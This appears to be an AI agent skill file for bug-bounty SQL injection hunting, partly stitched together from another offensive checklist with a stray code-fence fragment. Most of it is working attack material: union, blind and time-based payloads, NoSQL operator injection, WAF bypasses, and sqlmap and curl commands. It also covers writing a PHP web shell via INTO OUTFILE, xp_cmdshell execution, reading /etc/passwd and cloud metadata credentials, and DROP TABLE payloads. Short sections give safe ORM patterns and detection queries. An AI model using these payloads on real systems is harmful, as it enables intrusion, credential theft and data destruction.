---
name: hunt-sqli
description: Comprehensive SQL injection testing: union-based, blind, error-based, time-based, WAF bypass. Modern SQLi techniques for bug bounty.
---

## Crown Jewel Targets

SQL injection remains one of the highest-paying vulnerability classes in bug bounty because it directly threatens data confidentiality, integrity, and availability at scale.

**Highest-value targets:**
- **SaaS platforms with multi-tenant databases** — one injection can expose all customer data
- **E-commerce/payment systems** — PII, card data, transaction records
- **Search endpoints** — user-controlled input passed directly to queries (e.g., Rockstar Games `/search`)
- **Analytics/tracking subdomains** — often built fast, tested less (e.g., `sctrack.email.uber.com.cn`)
- **Third-party plugins on enterprise installs** — WordPress plugins, CMS extensions running on corporate domains (Uber's Huge IT Video Gallery)
- **Internal tooling exposed externally** — Apache Airflow, GitHub Enterprise, admin dashboards
- **NoSQL backends (MongoDB)** — often overlooked, same injection class, different syntax

**Asset types that pay most:**
- Production APIs with `/search`, `/filter`, `/sort`, `/report` parameters
- Subdomains with legacy stacks (`.cn`, `.co`, `.io` regional variants)
- Self-hosted open-source tools (Airflow, GitLab, Jenkins) on bounty scope
- Email tracking and analytics infrastructure

---

## Attack Surface Signals

**URL patterns that suggest injectable parameters:**
```
/search?q=
/filter?category=
/sort?by=&order=
/report?start_date=&end_date=
/api/v1/items?id=
/index.php?id=
/gallery?album_id=
/track?uid=&campaign=
?page=&limit=&offset=
```

**Response header signals:**
- `X-Powered-By: PHP` — likely MySQL/PostgreSQL backend
- `Server: Apache` + PHP — classic LAMP stack
- `X-Powered-By: Express` — possible MongoDB/NoSQL backend
- Database error messages leaking in responses (MySQL, PostgreSQL, MSSQL error strings)

**JavaScript patterns indicating dynamic query construction:**
```javascript
// Look for these in JS bundles
fetch(`/api/search?q=${userInput}`)
$.ajax({ url: '/filter?sort=' + param })
axios.get('/report?from=' + startDate + '&to=' + endDate)
```

**Tech stack signals:**
- WordPress sites with third-party plugins (check `/wp-content/plugins/`)
- Apache Airflow endpoints (`/admin/`, `/api/experimental/`)
- GitHub Enterprise (`/_graphql`, `/search`, `/api/v3/`)
- Node.js + MongoDB combinations (check for `$where`, `$regex` in request bodies)
- PHP applications returning verbose MySQL errors

**Content-type signals for NoSQL:**
- `Content-Type: application/json` bodies with nested object parameters
- Parameters accepting arrays: `param[]=value` or `{"key": {"$gt": ""}}`

---

## Step-by-Step Hunting Methodology

1. **Enumerate all input vectors** — Use Burp Suite passive scan during normal app usage. Capture every parameter: GET, POST, JSON body, HTTP headers (User-Agent, Referer, X-Forwarded-For), cookies, path segments.

2. **Identify the tech stack** — Check response headers, error messages, job postings, Wappalyzer, BuiltWith. Determines which payloads to prioritize (MySQL vs PostgreSQL vs MongoDB).

3. **Baseline the response** — Note normal response length, status code, and response time for a clean request. This is your diff baseline.

4. **Send error-based probes** — Inject single quote `'`, double quote `"`, backtick `` ` ``, and observe for:
   - Database error messages (immediate confirmation)
   - Response length change
   - HTTP 500 errors

5. **Test boolean-based blind** — Send true/false conditions and compare responses:
   - `param=1 AND 1=1` vs `param=1 AND 1=2`
   - If responses differ → likely injectable

6. **Test time-based blind** — When no visible difference exists:
   - MySQL: `param=1 AND SLEEP(5)`
   - PostgreSQL: `param=1; SELECT pg_sleep(5)--`
   - MSSQL: `param=1; WAITFOR DELAY '0:0:5'--`
   - Measure response time delta > 5 seconds = confirmed

7. **For NoSQL (MongoDB)** — Test object injection via JSON body and PHP-style array params:
   - Replace string value with `{"$gt": ""}` in JSON
   - Try `param[$ne]=invalid` in query strings

8. **Automate confirmation** — Run `sqlmap` on confirmed candidates with `--level=3 --risk=2` to enumerate databases without manual effort.

9. **Escalate impact** — Attempt:
   - `UNION`-based extraction (enumerate columns first)
   - `INFORMATION_SCHEMA` dump
   - File read/write (`LOAD_FILE`, `INTO OUTFILE`) if permissions allow
   - Stacked queries for RCE (MSSQL `xp_cmdshell`)

10. **Document the full chain** — Capture Burp repeater request/response, sqlmap output, and proof of data extraction (non-sensitive fields only for report).

---

## Payload & Detection Patterns

**Initial Error-Based Probes:**
```sql
'
''
`
')
"))
' OR '1'='1
' OR 1=1--
" OR 1=1--
' OR 1=1#
admin'--
```

**Boolean-Based Blind:**
```sql
' AND 1=1--   (true condition)
' AND 1=2--   (false condition)
' AND SUBSTRING(version(),1,1)='5'--
1 AND (SELECT COUNT(*) FROM users) > 0--
```

**Time-Based Blind:**
```sql
-- MySQL
' AND SLEEP(5)--
1; SELECT SLEEP(5)--

-- PostgreSQL  
'; SELECT pg_sleep(5)--
1 AND (SELECT 1 FROM pg_sleep(5))--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
1; EXEC xp_cmdshell('ping -n 5 127.0.0.1')--

-- SQLite
' AND (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2)))))==1--
```

**UNION-Based (enumerate columns first):**
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 10--   (find column count via error)
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,database(),3--
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
```

**NoSQL Injection (MongoDB):**
```javascript
// JSON body injection
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"$where": "this.username == this.password"}

// Query string injection
username[$ne]=invalid&password[$ne]=invalid
username[$regex]=.*&password[$regex]=.*
```

**PHP Hash/Array Injection:**
```
# Replace scalar with array
param[key]=value
param[$gt]=0
param[$ne]=null
```

**Grep patterns for JS source hunting:**
```bash
# Find unsanitized query construction in JS
grep -r "query\s*+=" src/
grep -r "WHERE.*\+" src/
grep -r "\.find({" src/ | grep -v "sanitize\|escape"
grep -rE "db\.query\(.*\+" src/
```

**curl time-based detection:**
```bash
# Baseline
curl -o /dev/null -s -w "%{time_total}\n" "https://target.com/search?q=test"

# Inject
curl -o /dev/null -s -w "%{time_total}\n" "https://target.com/search?q=test' AND SLEEP(5)--"

# SQLMap quick scan
sqlmap -u "https://target.com/search?q=test" --dbs --level=3 --risk=2 --batch

# SQLMap with POST
sqlmap -u "https://target.com/api/filter" --data="category=electronics&sort=price" --dbs --batch

# SQLMap with cookie auth
sqlmap -u "https://target.com/admin/report" --cookie="session=TOKEN" --dbs --batch --level=5
```

**Burp Intruder payload list for column enumeration:**
```
§1§
§1§,§1§
§1§,§1§,§1§
§1§,§1§,§1§,§1§
```

---

## Common Root Causes

1. **String concatenation instead of parameterized queries** — The #1 root cause. Developers build SQL strings with user input directly: `"SELECT * FROM items WHERE id=" + userId`.

2. **ORMs bypassed for "performance"** — Developer switches from safe ORM to raw query for complex joins or reports: `db.query("SELECT " + userColumn + " FROM table")`.

3. **Search/filter functionality** — Sorting and filtering logic is notoriously hard to parameterize (column names can't be bound), leading to allowlist bypasses or no protection at all.

4. **Third-party plugin/library vulnerabilities** — Developers trust installed plugins (WordPress, Joomla extensions) without auditing their query logic (Uber's Huge IT Video Gallery case).

5. **Legacy codebases** — Old PHP 4/5 code predating PDO/MySQLi prepared statements, still running in production on acquired assets or regional subdomains.

6. **Internal tools promoted to external** — Tools like Apache Airflow were designed for internal use with minimal security hardening, then exposed to authenticated external users.

7. **NoSQL false sense of security** — Developers believe "we use MongoDB so no SQL injection" and skip input validation entirely, enabling object/operator injection.

8. **Insufficient escaping of ORDER BY / GROUP BY** — These clauses cannot use bound parameters, so developers escape manually (and often incorrectly).

9. **HTTP header and non-obvious inputs** — `User-Agent`, `Referer`, `X-Forwarded-For` stored in DB without sanitization, assuming they're "trusted" server-side values.

---

## Bypass Techniques

**WAF Bypass Techniques:**

*Keyword obfuscation:*
```sql
-- Space substitution
SELECT/**/username/**/FROM/**/users
SEL/**/ECT username FROM users
%09SELECT%09username%09FROM%09users  (tab)
SELECT%0Ausername%0AFROM%0Ausers    (newline)

-- Case variation
SeLeCt UsErNaMe FrOm UsErS
sElEcT username fRoM users

-- Comment injection
SE/**/LECT username FR/**/OM users
/*!SELECT*/ username /*!FROM*/ users  (MySQL version comments)
/*!50000SELECT*/ username FROM users
```

*Encoding bypasses:*
```
URL encode: %27 = '  %20 = space  %23 = #
Double URL encode: %2527 = %27 = '
Unicode: ʼ (U+02BC) as quote substitute
HTML entity (in reflected contexts): &#39;
```

*Operator substitution:*
```sql
-- Avoid "OR" and "AND"
' || '1'='1
' && '1'='1
UNION ALL SELECT  (instead of UNION SELECT)
```

*Function substitution:*
```sql
-- When SLEEP is blocked
BENCHMARK(10000000,MD5(1))
GET_LOCK('a',5)
-- When UNION is blocked
INTO OUTFILE  (different extraction method)
```

*Header-based injection to avoid URL WAFs:*
```bash
curl -H "X-Forwarded-For: 127.0.0.1' AND SLEEP(5)--" https://target.com/
curl -H "User-Agent: test' AND SLEEP(5)--" https://target.com/
curl -H "Referer: https://evil.com/' AND SLEEP(5)--" https://target.com/
```

*JSON/NoSQL WAF bypass:*
```json
{"username": {"$\u0067t": ""}}
{"user\u006eame": {"$gt": ""}}
```

*Authentication bypass for "authenticated-only" injection (Airflow pattern):*
- Obtain low-privilege account (free tier, trial, leaked creds)
- Inject via authenticated endpoints — WAFs often whitelist authenticated traffic

*Chunked transfer encoding to bypass body inspection:*
```
Transfer-Encoding: chunked
(split payload across chunks to evade WAF reassembly)
```

---

## Gate 0 Validation

Before writing the report, answer all three:

**1. What can the attacker DO right now?**
Must be able to demonstrate at least one of:
- Extract database version/name via error message or UNION
- Prove time-delay control (5s sleep with `SLEEP(5)`, confirmed by timing)
- Extract a row from `information_schema.tables`
- Bypass authentication via boolean injection
- For NoSQL: bypass login or extract collection data

If the only evidence is an error message change with no data extraction or timing proof, it may be informational only (like Report 1 — rated Low).

**2. What does the victim LOSE?**
Must identify specific data at risk:
- PII (names, emails, passwords, addresses)
- Authentication credentials or session tokens
- Business data (transactions, proprietary records)
- Ability to exfiltrate to attacker-controlled server

A generic "database could be read" without identifying what database/table contains sensitive data weakens the report significantly.

**3. Can it be reproduced in 10 minutes from scratch?**
Must have:
- Single curl command or Burp repeater request that demonstrates the vulnerability
- No dependency on specific session state that expires immediately
- SQLMap tamper script or manual payload that consistently triggers the behavior
- Screen recording or step-by-step that a triage engineer can follow without your help

If you need more than one account, special timing, or race conditions to reproduce — document all prerequisites explicitly before submitting.

---

## Real Impact Examples

**Scenario A — Regional Subdomain, Legacy Stack (Uber sctrack pattern)**
An email tracking subdomain (`sctrack.email.[company].com.cn`) built on a legacy PHP stack accepted a `uid` parameter for tracking email opens. The parameter was concatenated directly into a MySQL query. Using a time-based blind payload, an unauthenticated attacker could enumerate the entire database schema, extract email campaign recipient lists including PII, and potentially pivot to internal infrastructure. Regional subdomains are often managed by local teams with lower security maturity and outside the primary WAF perimeter — making them consistently high-yield targets.

**Scenario B — Third-Party Plugin on Enterprise Domain (Uber WordPress plugin pattern)**
A company's marketing site ran WordPress with the Huge IT Video Gallery plugin. The plugin's `album_id` parameter was unparameterized. Because the site shared database credentials with other services, exploitation could reach beyond the WordPress installation. This illustrates the plugin supply chain risk: the parent company's bug bounty scope included the domain, but the vulnerable code was entirely third-party. Hunting WordPress plugins means auditing installed plugins against known CVEs AND testing for novel injections in their parameters — the enterprise brand amplifies the payout even when the root cause is a $20 plugin.

**Scenario C — Authenticated Internal Tool Exposed Externally (Airflow pattern)**
Apache Airflow's web interface, deployed for workflow orchestration and accessible to authenticated users, contained SQL injection in a filter/search parameter within the admin UI. Because Airflow often runs with database superuser credentials (it needs to manage its own metadata DB), exploitation by any authenticated user — including low-privilege accounts — could lead to full database read/write access and potentially OS-level command execution via `COPY TO/FROM` or similar DB features. The lesson: "authenticated-only" does not mean "safe" — internal tools have weak authorization models and often over-privileged DB connections.

---

## Disclosed Report Citations (Backfill +4 — 2021-2024)

The following real, verified bug-bounty / CVE / coordinated-disclosure cases extend this skill with **modern** (2021-2024) examples emphasising NoSQL and ORM-bypass — the two SQLi families most under-represented in older bundles.

9. **Rocket.Chat — Pre-auth blind NoSQL injection in `getPasswordPolicy` (CVE-2021-22911)** ([H1 #1130721](https://hackerone.com/reports/1130721) · [Sonar writeup](https://www.sonarsource.com/blog/nosql-injections-in-rocket-chat/))
    - Subclass: NoSQL injection (MongoDB `$regex` operator) — pre-auth
    - Payload (Meteor DDP method call): `{"msg":"method","method":"getPasswordPolicy","params":[{"token":{"$regex":"^a"}}]}` — brute-force password-reset token character-by-character via response-time/boolean side-channel, then chain to admin password reset → RCE via integrations
    - Root cause: Meteor `methods` accepted raw object selectors; `getPasswordPolicy` did not validate that `token` was a string before passing it to Mongo `findOne`
    - Year: 2021 — H1 private bounty paired with CVE-2021-22911

10. **Mongoose ORM — `$where` injection via `populate({match})` (CVE-2024-53900 + CVE-2025-23061)** ([GHSA-m7xq-9374-9rvx](https://github.com/advisories/GHSA-m7xq-9374-9rvx))
    - Subclass: NoSQL injection — ORM raw-operator bypass (Mongoose Node.js)
    - Payload: `Model.find().populate({path:'author', match:{$where:"sleep(5000) || true"}})` — attacker-controlled JSON forwarded into `populate({match})` reached MongoDB `$where`, executing arbitrary server-side JavaScript → blind exfil + DoS
    - Root cause: Mongoose < 8.8.3 did not strip `$where` inside `match` filters; developers assumed ORM-level safety
    - Year: 2024 — reported via the Mongoose project / GitHub Security Lab IBB

11. **Django — `QuerySet.values()` JSONField SQL Injection (CVE-2024-42005)** ([H1 #2646493](https://hackerone.com/reports/2646493) · [Commit](https://github.com/django/django/commit/c87bfaacf8fb84984243b5055dc70f97996cb115))
    - Subclass: ORM raw-fragment SQLi (Django ORM — column-alias injection)
    - Payload: `Item.objects.values('data__"); DROP TABLE x;--')` — a crafted JSON-path key (passed as `*args` from a request parameter) was used as a SQL column alias without escaping; `.values()` emitted `SELECT (data->>'…') AS "…"; DROP TABLE x;--"`
    - Root cause: Django emitted unquoted column aliases derived from user-supplied JSONField key strings; assumed alias values were always developer-controlled
    - Year: 2024 — CVSS 9.8, reported by Eyal Gabay (EyalSec) through Django's HackerOne program → IBB award

12. **Mozilla — Boolean-based blind SQLi on `mozilla.social` invite endpoint** ([H1 #2209130](https://hackerone.com/reports/2209130))
    - Subclass: boolean-based blind SQLi on an authentication-adjacent endpoint
    - Payload: `POST /invite {"code":"abc' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"}` — boolean differentiation between "invalid code" and "code accepted, redirect issued" allowed schema/table enumeration on the OIDC proxy Postgres backend
    - Root cause: invite-code lookup built a raw SQL string against the proxy's Postgres DB; developers assumed the code was short/opaque and skipped parameter binding
    - Year: 2023 — Mozilla H1 bounty (amount redacted in disclosure)

---

## Related Skills & Chains

- **`hunt-rce`** — A SQLi against a DB user with `FILE`, `xp_cmdshell`, or `COPY FROM PROGRAM` privileges is an RCE primitive, not just a data-read. Chain primitive: MSSQL union-based SQLi → `EXEC xp_cmdshell 'whoami'` → RCE as `NT AUTHORITY\SYSTEM`; Postgres SQLi with `pg_read_server_files` or `COPY ... FROM PROGRAM 'id'` → RCE; MySQL SQLi with `FILE` → write webshell to web-root via `INTO OUTFILE`.
- **`hunt-idor`** — Once SQLi gives you arbitrary read on the users table, you have the IDs/UUIDs needed to enumerate IDOR endpoints at scale. Chain primitive: blind SQLi extracts `users.uuid` column → feed UUIDs into `/api/users/{uuid}/profile` → confirmed mass IDOR-with-PII rather than a theoretical broken-access-control.
- **`hunt-auth-bypass`** — Classic `' OR 1=1 --` in login forms or session tables is auth-bypass-via-SQLi. Chain primitive: SQLi on the `password_reset_tokens` table → read or insert a token row for `admin@target.com` → ATO without ever seeing the original password.
- **`security-arsenal`** — Reach for the SQLi payload tree (WAF-bypass union variants `/**/UnIoN/**/SeLeCt/**/`, MSSQL `WAITFOR DELAY '0:0:10'`, MySQL `SLEEP(10)`, Postgres `pg_sleep(10)`, Oracle `DBMS_PIPE.RECEIVE_MESSAGE`, NoSQLi `{"$ne": null}` / `{"$where": "sleep(5000)"}`, second-order via stored-then-rendered fields).
- **`triage-validation`** — Apply the Reproducibility Gate before reporting. A 200ms delta on a sleep-10 payload is noise, not blind SQLi. Require statistical evidence (5 trials at 0s vs 5 trials at 10s, non-overlapping confidence intervals) or an OOB DNS callback with a unique marker. The hunt-sqli internal sentinel/baseline pattern exists for exactly this.

---

# Additional Techniques (merged from offensive-sqli/SKILL.md)

## Quick Workflow

1. Map all input vectors that reach the database (URL params, POST body, cookies, headers, API filters, WebSocket messages)
2. Insert probe payloads to detect classic SQLi; fall back to inferential (boolean/time-based) if no visible error
3. Identify database type and enumerate schema
4. Exploit to extract data, escalate privileges, or achieve RCE where in scope
5. Document findings and suggest remediation

---

### Basic Probes — All Input Vectors

```
' " ; -- /* */ # ) ( + , \  %
' OR '1'='1
" OR "1"="1
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

### Error-Based Detection

Trigger syntax errors to reveal database type and query structure:

```
'  ''  `  "  ""  ,  %  \
```

Look for: SQL syntax errors, DB version strings, table/column names leaked in responses.

### JSON Operator Probes

```sql
-- MySQL
id=1 AND JSON_EXTRACT('{"a":1}', '$.a')=1
-- PostgreSQL
id=1 AND '{"a":1}'::jsonb ? 'a'
```

### WebSocket SQLi

```javascript
const ws = new WebSocket("wss://target.com/api/search");
ws.send('{"action":"search","query":"test\\\' OR 1=1--"}');
```

### REST API Filter Injection

```json
POST /api/users/search
{
  "filter": { "name": {"$regex": "admin' OR 1=1--"} },
  "sort": "name'; DROP TABLE users--"
}
```

---

# Full pipeline
sublist3r -d target | tee domains
cat domains | httpx | tee alive
cat alive | waybackurls | tee urls
gf sqli urls >> sqli
sqlmap -m sqli --dbs --batch

# Hidden parameter discovery
hakrawler -url https://target.com | tee crawl
arjun -i crawl -oJ params.json
```

---

### Determine Column Count (UNION)

```sql
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
```

### Identify String Columns

```sql
' UNION SELECT 'a',NULL,NULL-- -
' UNION SELECT NULL,'a',NULL-- -
```

### Enumerate Schema

```sql
-- DB version
' UNION SELECT @@version --          -- MySQL/MSSQL
' UNION SELECT version() --          -- PostgreSQL
' UNION SELECT banner FROM v$version -- -- Oracle

-- Tables
' UNION SELECT table_name,1 FROM information_schema.tables --    -- MySQL/MSSQL/PG
' UNION SELECT table_name,1 FROM all_tables --                   -- Oracle

-- Columns
' UNION SELECT column_name,1 FROM information_schema.columns WHERE table_name='users' --
```

### Blind Data Extraction

```sql
-- Boolean character-by-character
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 0,1)='a'-- -

-- Time-based conditional
' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)-- -
```

---

### MySQL / MariaDB

```sql
-- File read
' UNION SELECT LOAD_FILE('/etc/passwd') --

-- Write web shell
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php' --

-- Schema leak
' UNION SELECT table_schema,table_name FROM information_schema.tables
  WHERE table_schema NOT IN ('mysql','information_schema') --
```

### Neo4j / Cypher (CVE-2024-34517)

```cypher
-- Normal
MATCH (u:User) WHERE u.name = 'admin' RETURN u
-- Bypass
MATCH (u:User) WHERE u.name = 'admin' OR 1=1 //--' RETURN u
```

Older Neo4j 5.x (<5.18 / <4.4.26) allowed privilege escalation via IMMUTABLE procedures.

---

### AWS

```sql
-- IMDSv1 credential theft (legacy environments)
' UNION SELECT LOAD_FILE('http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name') --

-- RDS Proxy disruption
'; CALL mysql.rds_kill(CONNECTION_ID()); --
```

### Azure

```sql
-- Azure SQL Managed Instance RCE
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
'; EXEC xp_cmdshell 'az vm list'; --

-- Instance metadata
' UNION SELECT LOAD_FILE('http://169.254.169.254/metadata/instance?api-version=2021-02-01') --
```

### Lambda / Serverless Connection Pool Poisoning

```javascript
// SET ROLE persists across Lambda invocations when DB connections are reused
exports.handler = async (event) => {
  await db.query(`SET ROLE '${event.role}'`); // injectable — poisons pool
  return await db.query("SELECT * FROM sensitive_data");
};
```

---

## ORM CVE Tracking (2023–2025)

| ORM | CVE / Issue | Vulnerable Pattern |
|-----|------------|-------------------|
| Sequelize | CVE-2023-22578 | `sequelize.literal(\`name = '${userInput}'\`)` |
| TypeORM <0.3.12 | findOne injection | `repository.findOne({ where: \`id = ${id}\` })` |
| Hibernate 6.x | Query cache poisoning | `session.createQuery("FROM User WHERE name = '" + input + "'")` |
| Prisma <4.11 | Raw query | `prisma.$executeRawUnsafe(\`SELECT * FROM users WHERE id = ${id}\`)` |

**Safe ORM patterns:**

```javascript
// Sequelize — use replacements
sequelize.query('SELECT * FROM users WHERE name = :name', { replacements: { name: user } })
// Prisma — tagged template literal
await prisma.$queryRaw`SELECT * FROM users WHERE name = ${user}`
// Knex
knex('users').whereRaw('name = ?', [user])
```

---

## Quick-Reference Cheatsheet

| DB | Version | Time Delay | String Concat | Schema Source |
|----|---------|-----------|--------------|---------------|
| MySQL | `@@version` | `SLEEP(5)` | `CONCAT('a','b')` | `information_schema.tables` |
| MSSQL | `@@version` | `WAITFOR DELAY '0:0:5'` | `'a'+'b'` | `information_schema.tables`, `sys.tables` |
| PostgreSQL | `version()` | `pg_sleep(5)` | `'a'\|\|'b'` | `information_schema.tables` |
| Oracle | `banner FROM v$version` | `DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)` | `'a'\|\|'b'` | `all_tables`, `all_tab_columns` |

---

## Detection & Monitoring Queries

**Splunk:**

```spl
index=web sourcetype=access_combined
| regex _raw="(%27)|(\\')|(\\-\\-)|((%3D)|(=))[^\\n]*((%27)|(\\')|(\\-\\-)|(\\%3D))"
| eval suspected_sqli=if(match(_raw,"(?i)(union|select|insert|update|delete|drop|create|alter|exec)"),"high","low")
| where suspected_sqli="high"
| table _time, src_ip, uri, user_agent, status
```

**AWS CloudWatch Insights (RDS):**

```
fields @timestamp, @message
| filter @message like /(?i)(UNION|SELECT.*FROM|INSERT INTO|UPDATE.*SET|DELETE FROM)/
| filter @message like /(%27|'|--|\\/\\*)/
| stats count() by bin(5m)
```

---

## Key References

- MITRE ATT&CK: T1190 (Exploit Public-Facing Application)
- OWASP ASVS 4.0: V5.3.4 — parameterized queries required
- PCI DSS 4.0: Requirement 6.2.4 — injection protection mandatory
- CISA KEV Catalog — monitor for actively exploited SQLi CVEs
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/sql-injection.md